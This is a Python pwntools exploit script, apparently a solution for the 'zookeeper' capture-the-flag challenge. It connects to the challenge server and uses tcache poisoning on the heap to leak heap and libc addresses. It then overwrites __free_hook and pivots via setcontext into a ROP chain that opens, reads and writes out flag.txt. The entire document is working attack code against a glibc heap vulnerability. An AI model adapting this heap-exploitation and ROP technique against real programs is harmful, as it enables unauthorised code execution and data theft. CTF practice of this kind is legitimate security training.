#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("./vuln")
libc = ELF("libc.so.6")

#conn = elf.process()
#conn = process(["./ld-2.31.so", "./vuln"], env={"LD_PRELOAD": "./libc-2.31.so ./libseccomp.so.2.5.1"})
#conn = process("./run.sh")
conn = remote("zookeeper.chal.imaginaryctf.org", 1337)
#context.log_level = 'debug'
class Tcache():
  def __init__(self):
    self.counts = [0]*64
    self.bins = [0]*64
  def dump(self):
    out = b""
    out += b"".join([p16(n) for n in self.counts])
    out += b"".join([p64(n) for n in self.bins])
    return out

def alloc(idx, size, stuff):
  conn.sendline(b"f")
  conn.sendlineafter(b"idx:", str(idx).encode())
  conn.sendlineafter(b"len:", str(size).encode())
  conn.sendafter(b"content:", stuff)

def free(idx):
  conn.sendline(b"l")
  conn.sendlineafter(b"idx:", str(idx).encode())

def view(idx, lines):
  conn.sendline(b"v")
  conn.sendlineafter(b"idx:", str(idx).encode())
  conn.recvline()
  return conn.recvlines(lines)


alloc(0, 0x1c0, b"0000")
alloc(1, 0x10, b"1111")
alloc(2, 0x500, b"2222")
alloc(3, 0x150, b"3333")
free(0)
free(2)
alloc(4, 0x280, b"\x00"*0x40)
alloc(5, 0x450, b"5555555\n")
heap = u64(view(5,2)[1] + b'\x00\x00') - 0x20b0
info("tcache_perthread_struct @ " + hex(heap))
free(1)
t = Tcache()
t.bins[40] = heap + 0x2f0
t.bins[39] = heap
t.bins[3] = heap + 0x1000
t.counts[40] = 1
t.counts[39] = 1
alloc(6, 0x280, t.dump())
alloc(7, 0x290, b'a')
libc.address = u64(view(7,1)[0] + b'\x00\x00') - 0x212c61 + 0x214000
info("libc @ " + hex(libc.address))
t = Tcache()
t.bins[41] = libc.sym.__free_hook
t.bins[50] = heap + 0x24b0
t.bins[4] = heap + t.dump().index(p64(heap + 0x24b0))
t.counts[41] = 1
t.counts[4] = 2
alloc(10, 0x280, t.dump())

setcontext_gadget = libc.address + 0x580dd
call_gadget = libc.address + 0x154930

alloc(11, 0x2a0, p64(call_gadget))

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rdx_r12 = rop.find_gadget(["pop rdx", "pop r12", "ret"])[0]
push_rax = libc.address + 0x45197
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
xchg_eax_edi = libc.address + 0x2ad2b
syscall_ret = rop.find_gadget(["syscall", "ret"])[0]

base = heap + 0x24b0
payload = p64(1)
payload += p64(base)
payload += b"valid management"
payload += p64(setcontext_gadget)
payload += p64(0)                 # <-- [rdx + 0x28] = r8
payload += p64(0)                 # <-- [rdx + 0x30] = r9
payload += b"A"*0x10              # padding
payload += p64(0)                 # <-- [rdx + 0x48] = r12
payload += p64(0)                 # <-- [rdx + 0x50] = r13
payload += p64(0)                 # <-- [rdx + 0x58] = r14
payload += p64(0)                 # <-- [rdx + 0x60] = r15
payload += p64(base + 0x158)      # <-- [rdx + 0x68] = rdi (ptr to flag path)
payload += p64(0)                 # <-- [rdx + 0x70] = rsi (flag = O_RDONLY)
payload += p64(0)                 # <-- [rdx + 0x78] = rbp
payload += p64(0)                 # <-- [rdx + 0x80] = rbx
payload += p64(0)                 # <-- [rdx + 0x88] = rdx 
payload += b"A"*8                 # padding
payload += p64(0)                 # <-- [rdx + 0x98] = rcx 
payload += p64(base + 0xa0)      # <-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain
payload += p64(pop_rax)           # <-- [rdx + 0xa8] = rcx, will be pushed to rsp
payload += p64(2)
payload += p64(syscall_ret) # sys_open("/path/to/flag", O_RDONLY)
payload += p64(xchg_eax_edi)
payload += p64(pop_rsi)
payload += p64(libc.bss(42)) # destination buffer, can be anywhere readable and writable
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall_ret) # sys_read(eax, bss, 0x100)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(libc.bss(42)) # buffer
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall_ret) # sys_write(1, bss, 0x100)
payload += b"flag.txt"

alloc(12, 0x3000, payload)
free(12)

conn.interactive()

